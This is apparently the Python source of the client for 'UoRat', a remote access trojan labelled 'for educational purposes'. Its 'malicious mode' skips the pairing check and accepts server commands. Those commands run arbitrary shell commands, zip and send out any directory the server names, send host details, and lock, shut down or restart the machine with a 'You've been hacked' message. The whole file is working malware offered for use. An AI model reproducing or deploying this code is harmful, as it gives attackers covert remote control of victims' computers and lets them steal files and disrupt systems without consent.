"""

+-----------------------------------------------------------------------+
|                               UoRat                                   |
|    Author: 27016005                                                   |
|    Version: 0.2.3                                                     |
|    Last update: 25-02-2021 (dd-mm-yyyy)                               |
|                                                                       |
|                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
+-----------------------------------------------------------------------+

"""


import os
import platform
import socket
import subprocess
import sys
import time
from zipfile import ZipFile
from pprint import pprint


class Client:
    def __init__(self, server_ip, port, buffer_size, client_ip):
        self.SERVER_IP = server_ip
        self.PORT = port
        self.BUFFER_SIZE = buffer_size
        self.CLIENT_IP = client_ip
        # self.recvcounter = 0

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connectToServer(self):
        self.client.connect((self.SERVER_IP, self.PORT))

    def confirmconnection(self):
        gendkey = self.client.recv(self.BUFFER_SIZE).decode()
        print(gendkey)
        acceptancecode = input("Enter the Given Key: ")

        if acceptancecode != gendkey:
            # todo
            print("Pairing Failed")
            self.client.send("MISMATCH".encode("utf-8"))
            self.close()

        else:
            print("KEYS MATCHED - PAIRING SUCCESSFUL")
            self.client.send("MATCH".encode("utf-8"))

    def sendHostInfo(self):
        """ Extracting host information """

        host = sys.platform
        self.client.send(host.encode("utf-8"))
        # Make a Dictionary
        sys_info = {
                    "Platform": platform.system(),
                    "Platform Release": platform.release(),
                    "Platform Version": platform.version(),
                    "Platform Architecture": platform.architecture(),
                    "Machine Type": platform.machine(),
                    "Platform Node": platform.node(),
                    "Platform Information": platform.platform(),
                    "ALL": platform.uname(),
                    "HostName": socket.gethostname(),
                    "Host IP_Address": socket.gethostbyname(socket.gethostname()),
                    "CPU": platform.processor(),
                    "Python Build": platform.python_build(),
                    "Python Compiler": platform.python_compiler(),
                    "Python Version": platform.python_version(),
                    "Windows Platform": platform.win32_ver()
                  #  "OS": os.uname() # os.uname() ONLY SUPPORTED ON LINUX
                   }
        # https://www.geeksforgeeks.org/platform-module-in-python/#:~:text=Python%20defines%20an%20in%2Dbuilt,program%20is%20being%20currently%20executed.
        cpu = platform.processor()
        system = platform.system()
        machine = platform.machine()

        with open('./logs/info.txt', 'w+') as f:
            for k, v in sys_info.items():
                f.write(str(k) + ' >>> ' + str(v) + '\n')
                print(str(k) + ' >>> ' + str(v) + '\n')

        with open('./logs/info.txt', 'rb+') as f:
            self.client.send(f.read())
        print("CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n')
        input()
        pprint(sys_info)
        input()
        self.sysinfViaCMD()

    def sysinfViaCMD(self):
        # traverse the info
        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
        new = []

        # arrange the string into clear info
        for item in Id:
            new.append(str(item.split("\r")[:-1]))
        for i in new:
            print(i[2:-2])

    def txtmsg(self):
        print("TextMessageMode: Activated")
        message = self.client.recv(self.BUFFER_SIZE).decode()
        print("Server:", message)
        # self.send(output.encode())
        # self.client.send("[+] Message displayed and closed.".encode("utf-8"))
        time.sleep(2)
        self.client.send("[+] Message displayed and closed.".encode("utf-8"))

    def filesend(self):
        print("FILE SEND MODE: Enabled")
        filePath = self.client.recv(self.BUFFER_SIZE).decode("utf-8")

        filelist = os.listdir(filePath)
        self.client.send("Success".encode("utf-8"))
        # create a zip archive

        archname = './logs/files.zip'
        archive = ZipFile(archname, 'w')

        for file in filelist:
            archive.write(filePath + '/' + file)

        archive.close()

        # send size
        archivesize = os.path.getsize(archname)
        self.client.send(str(archivesize).encode("utf-8"))

        # send archive
        with open('./logs/files.zip', 'rb') as to_send:
            self.client.send(to_send.read())
            print("Should have worked.")

        # os.remove(archname)

    def runprocess(self, msg):
        obj = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                               shell=True)
        output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
        print("A")
        if output == "" or output == "\n":
            print("B")
            self.client.send("[*] Done".encode("utf-8"))
        else:
            print("C")
            self.client.send(output.encode("utf-8"))

    def runrun(self, msg):
        obj = "failed"
        try:
            obj, _ = subprocess.run(msg, check=True, shell=True)
            # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
        except Exception as e:
            print("This failed too (runrun) : " + str(e) + " + " + str(obj))

    def enableTN(self):
        msg = "start /B start cmd.exe @cmd /c pkgmgr /iu:TelnetClient "
        self.runrun(msg)

    def playchess(self):
        msg = "start /B start cmd.exe @cmd /c telnet freechess.org "
        self.runrun(msg)
        # chess_true = subprocess.check_call("start /B start cmd.exe @cmd /k telnet freechess.org ", shell=True)

    def playstarwars(self):
        msg = "start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl "
        self.runrun(msg)
        # Sw = subprocess.check_call("start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl ", shell=True)

    def weather(self):
        msg = "start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com "
        self.runrun(msg)
        # weather = subprocess.check_call("start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com ", shell=True)

    def locksystem(self):
        msg = "rundll32.exe user32.dll, LockWorkStation"
        self.runrun(msg)

    def shutdown(self):
        msg = "shutdown /s"
        self.runrun(msg)

    def shutdownmessage(self):
        msg = "shutdown /s /e 'You've been hacked '"
        self.runrun(msg)

    def restart(self):
        msg = "shutdown /r"
        self.runrun(msg)

    def fakeshell(self):
        """ Shell """

        print("SHELL MODE ENABLED: ")
        msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
        if "cd" in msg.lower():
            try:
                d = msg[3:].strip()
                os.chdir(d)
                self.client.send("[*] Done".encode("utf-8"))
            except:
                self.client.send("[*] Dir not found / something went wrong.".encode("utf-8"))
        else:
            # subprocess.checkoutput
            self.runprocess(msg)
            # self.runrun(msg)

    def endless(self):
        malorgood = input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
        if malorgood == "1":
            print("Malicious mode enabled: ")
            self.client.send("1".encode("utf-8"))
        else:
            print("Virtuous mode enabled: ")
            self.client.send("2".encode("utf-8"))
            self.confirmconnection()
        while True:
            print("entered loop")
            msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
            print("message received {msg}")
            if msg == "msg":

                # self.msg()
                print("This is where it reached")
                self.txtmsg()
                print("This is where it reached")
                time.sleep(3)
            elif msg == "shell":
                self.fakeshell()
            elif msg == "sendZip":
                self.filesend()
            elif msg == "shutdown":
                self.getshutdown()
            elif msg == "disconn":
                break
            else:
                print("Server: msg = " + msg)
                self.client.send("[+] Message displayed and closed.".encode("utf-8"))


def main():
    SERVER_IP = "192.168.56.1"  # modify me
    PORT = 1337  # modify me (if you want)
    BUFFER_SIZE = 2048
    safemode = bool(True)

    try:
        os.mkdir('./logs')
    except FileExistsError:
        pass

    CLIENT = socket.gethostname()
    CLIENT_IP = socket.gethostbyname(CLIENT)
    print(CLIENT_IP)
    client = Client(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)

    client.connectToServer()
    client.endless()


if __name__ == "__main__":
    main()
